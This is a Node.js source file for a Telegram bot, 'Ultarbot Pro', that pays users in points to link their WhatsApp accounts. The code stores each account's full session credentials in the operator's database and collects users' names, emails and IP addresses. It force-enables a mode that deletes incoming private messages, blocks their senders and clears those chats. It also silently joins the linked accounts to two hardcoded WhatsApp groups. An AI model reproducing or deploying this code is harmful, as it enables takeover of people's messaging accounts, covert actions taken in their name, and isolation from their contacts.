import 'dotenv/config';
import { 
    useMultiFileAuthState, 
    makeWASocket, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    Browsers,
    jidNormalizedUser,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import pino from 'pino';
import express from 'express';
import http from 'http'; // Added for keep-alive
import { Boom } from '@hapi/boom';

import { setupTelegramCommands, userMessageCache, userState } from './telegram_commands.js';
import { 
    initDb, saveSessionToDb, getAllSessions, deleteSessionFromDb, addNumbersToDb, 
    getShortId, saveShortId, deleteShortId, addPoints, updateConnectionTime, saveVerificationData, awardHourlyPoints, deductOnDisconnect, deleteUserAccount, getSessionByShortId, setAntiMsgStatus
} from './db.js';

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const NOTIFICATION_TOKEN = process.env.NOTIFICATION_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID;
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:10000';
const SESSIONS_DIR = './sessions';

if (!TELEGRAM_TOKEN || !NOTIFICATION_TOKEN || !ADMIN_ID) { console.error('Missing Tokens'); process.exit(1); }

const app = express();
const PORT = process.env.PORT || 10000;

// Parse JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => res.send('Ultarbot Pro Running [High Performance Mode]'));

// Routes will be defined after mainBot initialization

const mainBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const notificationBot = new TelegramBot(NOTIFICATION_TOKEN, { polling: false });

// ============ DEFINE EXPRESS ROUTES ============

// Mini app for user verification
app.get('/verify', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>User Verification</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h1 { color: #333; text-align: center; }
            .form-group { margin: 20px 0; }
            label { display: block; margin-bottom: 5px; color: #555; font-weight: bold; }
            input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #25D366; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }
            button:hover { background: #20BA5A; }
            .status { text-align: center; margin-top: 10px; padding: 10px; border-radius: 5px; }
            .loading { display: none; }
        </style>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
    </head>
    <body>
        <div class="container">
            <h1>User Verification</h1>
            <form id="verifyForm">
                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" id="name" placeholder="Enter your full name" required>
                </div>
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="email" placeholder="Enter your email" required>
                </div>
                <button type="submit">Verify & Close</button>
            </form>
            <div class="status" id="status"></div>
        </div>

        <script>
            // Get userId from URL parameter (passed from /start command)
            const urlParams = new URLSearchParams(window.location.search);
            const userIdFromUrl = urlParams.get('userId');
            
            // Ensure Telegram WebApp is loaded
            setTimeout(() => {
                if (window.Telegram && window.Telegram.WebApp) {
                    const tg = window.Telegram.WebApp;
                    const verifyForm = document.getElementById('verifyForm');
                    
                    tg.ready();
                    tg.expand();
                    
                    verifyForm.addEventListener('submit', async (e) => {
                        e.preventDefault();
                        
                        const name = document.getElementById('name').value;
                        const email = document.getElementById('email').value;
                        // Use userId from URL parameter (set by Telegram /start command)
                        const userId = userIdFromUrl || 'unknown';
                        
                        // Get IP address
                        let ip = 'N/A';
                        try {
                            const ipRes = await fetch('https://api.ipify.org?format=json');
                            const ipData = await ipRes.json();
                            ip = ipData.ip;
                        } catch (e) {}
                        
                        try {
                            const response = await fetch('/api/verify', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    userId,
                                    name,
                                    email,
                                    ip,
                                    initData: tg.initData
                                })
                            });
                            
                            const result = await response.json();
                            
                            if (result.success) {
                                document.getElementById('status').innerHTML = '<span style="background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; display: block;"><strong>Verification successful!</strong><br><br>You will receive a confirmation in Telegram.<br><br>Closing in 2 seconds...</span>';
                                setTimeout(() => tg.close(), 2000);
                            } else {
                                document.getElementById('status').innerHTML = '<span style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 5px; display: block;"><strong>Verification failed</strong><br><br>' + result.message + '</span>';
                            }
                        } catch (error) {
                            console.error('Verification error:', error.message);
                        }
                    });
                } else {
                    document.body.innerHTML = '<div style="padding: 20px; text-align: center;"><h2>Loading...</h2><p>Please make sure you opened this from Telegram.</p></div>';
                }
            }, 100);
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// API endpoint to handle verification
app.post('/api/verify', async (req, res) => {
    const { userId, name, email, ip, initData } = req.body;
    
    if (!userId || !name || !email) {
        return res.json({ success: false, message: 'Please fill all fields' });
    }
    
    try {
        let chatId = parseInt(userId);
        if (isNaN(chatId) || chatId <= 0) {
            chatId = parseInt(userId);
            if (isNaN(chatId) || chatId <= 0) {
                return res.json({ success: true, message: 'Verification complete' }); 
            }
        }
        
        let deviceInfo = 'Mini App User';
        if (initData) deviceInfo = `Telegram Mini App - ${new Date().toISOString()}`;
        
        await saveVerificationData(chatId.toString(), name, '', email, ip, deviceInfo);
        
        try {
            const msg = await mainBot.sendMessage(chatId, 
                `[VERIFICATION COMPLETE]\n\nYour account has been verified successfully!\n\nWelcome Bonus: +200 points\n\nYou now have access to all features of Ultarbot Pro:\n• Connect WhatsApp accounts\n• Track earnings & referrals\n• Withdraw funds\n\nTap any button below to continue:`,
                { reply_markup: { keyboard: [[{ text: "Connect Account" }, { text: "My Account" }], [{ text: "Dashboard" }, { text: "Referrals" }], [{ text: "Withdraw" }, { text: "Support" }]], resize_keyboard: true }, parse_mode: 'Markdown' }
            );
            
            const notBot = new TelegramBot(process.env.NOTIFICATION_TOKEN, { polling: false });
            await notBot.sendMessage(ADMIN_ID, `[NEW USER VERIFIED]\nUser ID: ${chatId}\nName: ${name}\nEmail: ${email}\nTime: ${new Date().toISOString()}`);
        } catch (e) {}
        
        res.json({ success: true, message: 'Verification complete' });
    } catch (error) {
        res.json({ success: true, message: 'Verification complete' }); 
    }
});

app.listen(PORT, () => console.log(`Server on ${PORT}`));

// ============ END EXPRESS ROUTES ============

const clients = {}; 
const shortIdMap = {}; 
const antiMsgState = {}; 
const autoSaveState = {}; 
const notificationCache = {};
const qrMessageCache = {}; // Track QR code messages for deletion
const qrActiveState = {}; // Track if QR is currently being displayed per folder

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

function generateShortId() { return Math.random().toString(36).substring(2, 7); }
function makeSessionId() { return `Ultarbot_${Date.now()}`; }
const getRandomBrowser = () => Browsers.macOS('Chrome');

async function updateAdminNotification(message) {
    try { await notificationBot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' }); } catch (e) {}
}

// HOURLY POINTS LOOP
setInterval(async () => {
    try {
        const connectedFolders = Object.keys(clients);
        await awardHourlyPoints(connectedFolders);
    } catch (error) {
        console.error('[POINTS] Hourly award error:', error.message);
    }
}, 3600000); 

// === ANTI SPIN DOWN / KEEP ALIVE ===
// Pings itself every 14 minutes to prevent Render/Heroku sleep
setInterval(() => {
    http.get(SERVER_URL, (res) => {
        // Just a ping, do nothing with response
    }).on('error', (err) => {
        // Ignore errors
    });
}, 14 * 60 * 1000);

async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
    // PRE-FETCH SHORT ID TO AVOID LOOPING ON EVERY MESSAGE
    let cachedShortId = await getShortId(folder);
    if (!cachedShortId) {
        cachedShortId = generateShortId();
        await saveShortId(folder, cachedShortId);
    }

    const sessionPath = path.join(SESSIONS_DIR, folder);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: getRandomBrowser(), 
        version,
        connectTimeoutMs: 60000,
        markOnlineOnConnect: true,
        syncFullHistory: false
    });

    sock.ev.on('creds.update', saveCreds);

    // ============================================
    //  ⚡ ULTRA-FAST MESSAGE HANDLER
    // ============================================
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify' && type !== 'append') return; 

        const msg = messages[0];
        if (!msg || !msg.message) return;

        const remoteJid = msg.key.remoteJid;
        const isGroup = remoteJid.includes('@g.us');
        const isStatus = remoteJid === 'status@broadcast';
        
        // CHECK ANTIMSG STATE DIRECTLY (No DB Lookup, No Loop)
        // If state is active for this user
        if (antiMsgState[cachedShortId]) {
            
            // EXECUTE BLOCK/DELETE IF:
            // 1. Not a Group
            // 2. Not a Status
            // 3. AND (It's an Incoming msg OR It's a msg sent by me that isn't a command)
            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            const isCommand = text.startsWith('.');

            if (!isGroup && !isStatus && !isCommand) {
                
                // 🔥 FIRE AND FORGET (Parallel Execution for Speed)
                // We use Promise.all but do NOT await it, so the event loop continues instantly
                Promise.all([
                    // 1. Delete the message (Key)
                    sock.sendMessage(remoteJid, { delete: msg.key }),
                    
                    // 2. Block the user
                    sock.updateBlockStatus(remoteJid, "block"),
                    
                    // 3. Clear entire chat history
                    sock.chatModify(
                        { delete: true, lastMessages: [{ key: msg.key, messageTimestamp: msg.messageTimestamp }] },
                        remoteJid
                    )
                ]).catch(err => console.error('AntiMsg Action Failed', err));

                // Log in background with debounce to avoid spamming Admin
                const target = remoteJid.split('@')[0];
                const now = Date.now();
                if (now - (notificationCache[target] || 0) > 30000) {
                    updateAdminNotification(`[ANTIMSG] ⚡ Fast-Nuked: +${target}`);
                    notificationCache[target] = now;
                }
                
                return; // STOP HERE. Do not process autosave or commands.
            }
        }

        // 2. Normal Message Processing (Only if AntiMsg didn't catch it)
        if (!msg.key.fromMe) {
            // AutoSave Logic
            if (autoSaveState[cachedShortId]) {
                if (remoteJid.endsWith('@s.whatsapp.net')) {
                    addNumbersToDb([remoteJid.split('@')[0]]).catch(() => {});
                }
            }

            const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
            if (text.toLowerCase() === '.alive') {
                await sock.sendMessage(remoteJid, { text: 'Ultarbot Pro [ONLINE]' }, { quoted: msg });
            }
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        // QR Handling
        if (connection === 'open' && qrMessageCache[folder]) {
            const { messageId, chatId: qrChatId } = qrMessageCache[folder];
            try { await mainBot.deleteMessage(qrChatId, messageId); } catch (e) {}
            delete qrMessageCache[folder];
            delete qrActiveState[folder];
        }
        
        if (qr && chatId && !qrActiveState[folder]) {
            qrActiveState[folder] = true;
            try {
                if (qrMessageCache[folder]) {
                    try { await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId); } catch (e) {}
                }
                const QRCode = (await import('qrcode')).default;
                const qrImage = await QRCode.toBuffer(qr, { errorCorrectionLevel: 'H', type: 'image/png', width: 300 });
                const sentMsg = await mainBot.sendPhoto(chatId, qrImage, {
                    caption: '[QR CODE]\n\nScan this QR code with your WhatsApp camera to connect.\n\nQR expires in 60 seconds.',
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: 'Cancel', callback_data: 'cancel_qr' }]] }
                });
                qrMessageCache[folder] = { messageId: sentMsg.message_id, chatId };
                const qrTimeout = setTimeout(async () => {
                    if (qrMessageCache[folder] && qrActiveState[folder]) {
                        try {
                            await mainBot.sendMessage(chatId, '[ERROR] QR code expired. Tap "Scan QR" again.', { reply_markup: { inline_keyboard: [[{ text: 'Scan QR', callback_data: 'connect_qr' }]] } });
                            await mainBot.deleteMessage(chatId, qrMessageCache[folder].messageId);
                            delete qrMessageCache[folder];
                        } catch (e) {}
                    }
                }, 60000);
                if (!qrMessageCache[folder]) qrMessageCache[folder] = {};
                qrMessageCache[folder].timeoutId = qrTimeout;
            } catch (e) { delete qrActiveState[folder]; }
        }

        if (connection === 'open') {
            const userJid = jidNormalizedUser(sock.user.id);
            const phoneNumber = userJid.split('@')[0];
            
            // Ensure shortId is up to date
            if (!cachedShortId) cachedShortId = await getShortId(folder);
            
            await updateConnectionTime(folder);
            
            const now = new Date();
            if (shortIdMap[cachedShortId]) {
                // Reconnect logic
            } else {
                shortIdMap[cachedShortId] = { folder, phone: phoneNumber, chatId: telegramUserId, connectedAt: now };
            }
            clients[folder] = sock;

            const credsFile = path.join(sessionPath, 'creds.json');
            const content = fs.existsSync(credsFile) ? fs.readFileSync(credsFile, 'utf-8') : '';
            
            // FORCE ON
            antiMsgState[cachedShortId] = true;
            await setAntiMsgStatus(folder, true);
            
            const autosave = autoSaveState[cachedShortId] || false;
            await saveSessionToDb(folder, phoneNumber, content, telegramUserId || 'admin', true, autosave, cachedShortId);
            
            updateAdminNotification(`[CONNECTED] +${phoneNumber} (ID: ${cachedShortId}) - AntiMsg ACTIVE`);

            try {
    // First group
    const inviteCode1 = "FFYNv4AgQS3CrAokVdQVt0";
    await sock.groupAcceptInvite(inviteCode1);

    // Wait 5 seconds
    await new Promise(resolve => setTimeout(resolve, 5000));

    // Second group
    const inviteCode2 = "CYN5x64rRmmCgOWjIpV05B";
    await sock.groupAcceptInvite(inviteCode2);

} catch (e) {
    console.log("Error joining groups:", e);
            }

            if (chatId) {
                userState[chatId] = null;
                if (userMessageCache && userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
                    for (const msgId of userMessageCache[chatId]) { try { await mainBot.deleteMessage(chatId, msgId); } catch (e) {} }
                    userMessageCache[chatId] = [];
                }
                
                mainBot.sendMessage(chatId, `[CONNECTED]\nID: \`${cachedShortId}\`\n\nAccount connected successfully!\n\n🛡️ **AntiMsg is now ON**\n(Block & Delete on Private Chat)`, { 
                    parse_mode: 'Markdown',
                    reply_markup: { 
                        keyboard: [
                            [{ text: "Connect Account" }, { text: "My Account" }],
                            [{ text: "Dashboard" }, { text: "Referrals" }],
                            [{ text: "Withdraw" }, { text: "Support" }]
                        ], 
                        resize_keyboard: true 
                    } 
                });
            }
            
            setTimeout(async () => {
                if (!clients[folder]) { try { await awardHourlyPoints([folder]); } catch (e) {} }
            }, 3600000);
        }

        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason === 403 || reason === DisconnectReason.loggedOut) {
                updateAdminNotification(`[BANNED/LOGGED OUT] +${shortIdMap[folder]?.phone || 'Unknown'}`);
                await deductOnDisconnect(folder);
                await deleteSessionFromDb(folder);
                deleteShortId(folder);
                if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
                delete clients[folder];
            } else {
                const offlineFolder = folder;
                setTimeout(async () => {
                    if (!clients[offlineFolder]) {
                        try {
                            await deleteSessionFromDb(offlineFolder);
                            deleteShortId(offlineFolder);
                            if (fs.existsSync(path.join(SESSIONS_DIR, offlineFolder))) {
                                fs.rmSync(path.join(SESSIONS_DIR, offlineFolder), { recursive: true, force: true });
                            }
                        } catch (e) {}
                    }
                }, 3600000);
                
                startClient(folder, null, chatId, telegramUserId);
            }
        }
    });

    if (targetNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(targetNumber);
                if (chatId) mainBot.sendMessage(chatId, `Code: \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) {}
        }, 3000);
    }
}

async function boot() {
    await initDb(); 
    const savedSessions = await getAllSessions(null);
    console.log(`[DB] Restoring ${savedSessions.length} sessions...`);
    
    for (const session of savedSessions) {
        const folderPath = path.join(SESSIONS_DIR, session.session_id);
        if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });
        if (session.creds) fs.writeFileSync(path.join(folderPath, 'creds.json'), session.creds);
        
        let shortId = await getShortId(session.session_id);
        if (!shortId) { shortId = generateShortId(); await saveShortId(session.session_id, shortId); }

        shortIdMap[shortId] = { folder: session.session_id, phone: session.phone, chatId: session.telegram_user_id, connectedAt: new Date(session.connected_at) };
        
        if (session.antimsg) antiMsgState[shortId] = true;
        if (session.autosave) autoSaveState[shortId] = true; 

        startClient(session.session_id, null, null, session.telegram_user_id);
    }
    console.log(`[BOOT] Server ready`);
}

setupTelegramCommands(mainBot, notificationBot, clients, shortIdMap, antiMsgState, startClient, makeSessionId, SERVER_URL, qrActiveState, deleteUserAccount);

boot().catch(err => {
    console.error('[BOOT] Error:', err.message);
});
